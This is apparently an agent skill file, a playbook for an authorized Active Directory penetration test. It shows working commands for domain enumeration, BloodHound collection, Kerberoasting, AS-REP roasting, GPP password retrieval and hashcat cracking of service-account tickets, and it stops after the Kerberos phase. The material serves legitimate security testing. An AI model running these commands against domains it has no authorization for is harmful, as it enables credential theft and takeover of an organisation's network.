---
name: performing-active-directory-penetration-test
description: "Conduct a focused Active Directory penetration test using BloodHound. Signals: ad attack, domain penetration, domain controller."
zh-signals: "Conduct a focused Active Directory penetration test using BloodHound 信号:ad攻击,域渗透,域控。"
when-to-use: Conduct a focused Active Directory penetration test using BloodHound,
  Impacket, Certipy, Rubeus, and NetExec to enumerate domain objects, discover attack
  paths, exploit Kerberos weaknesses, escalate privileges via ADCS/DCSync, and demonstrate
  domain compromise. Use when running an authorized AD pentest from a standard domain
  user foothold toward Domain Admin or Enterprise Admin.
domain: cybersecurity
subdomain: penetration-testing
tags:
- active-directory
- BloodHound
- Kerberoasting
- Impacket
- DCSync
- ADCS
- domain-compromise
- privilege-escalation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1068
---

# Performing Active Directory Penetration Test

## Overview

Active Directory (AD) penetration testing targets the central identity and access management system used by over 95% of Fortune 500 companies. The test identifies misconfigurations, weak credentials, dangerous delegation settings, vulnerable certificate templates, and attack paths that enable an attacker to escalate from a standard domain user to Domain Admin or Enterprise Admin.


## When to Use

- When conducting security assessments that involve performing active directory penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Standard domain user credentials (minimum starting point)
- Network access to domain controllers (LDAP/389, Kerberos/88, SMB/445, DNS/53)
- Tools: BloodHound, Impacket, Certipy, Rubeus, NetExec, Mimikatz
- Kali Linux or Windows attack machine with domain access

## Phase 1 — AD Enumeration

### Domain Information Gathering

```bash
# Basic domain enumeration
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --groups
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --users

# LDAP enumeration — domain controllers
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName

# Enumerate trust relationships
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --trusts

# Enumerate domain password policy
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --pass-pol

# Enumerate Group Policy Objects
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords

# Find computers with unconstrained delegation
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  dNSHostName

# Find users with constrained delegation
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=user)(msds-allowedtodelegateto=*))" \
  sAMAccountName msds-allowedtodelegateto

# Enumerate LAPS
netexec ldap 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local -M laps
```

### BloodHound Attack Path Analysis

```bash
# Collect all BloodHound data
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local \
  -ns 10.0.0.5 -c all --zip

# Alternative: SharpHound from Windows
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Start BloodHound
sudo neo4j start
bloodhound --no-sandbox

# Key Cypher queries in BloodHound:
# - Shortest path to Domain Admin
# - Find Kerberoastable users
# - Find AS-REP Roastable users
# - Find users with DCSync rights
# - Find shortest path from owned principals
# - Find computers where Domain Users are local admin
```

### Service Account Discovery

```bash
# Find service accounts with SPNs (Kerberoastable)
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5

# Find accounts without Kerberos pre-authentication
impacket-GetNPUsers 'corp.local/' -usersfile domain_users.txt \
  -dc-ip 10.0.0.5 -format hashcat

# Find managed service accounts
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership
```

## Phase 2 — Kerberos Attacks

### Kerberoasting

```bash
# Extract TGS tickets for service accounts
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast.txt -request

# Crack with Hashcat (mode 13100 for Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# Targeted Kerberoasting with Rubeus (Windows)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
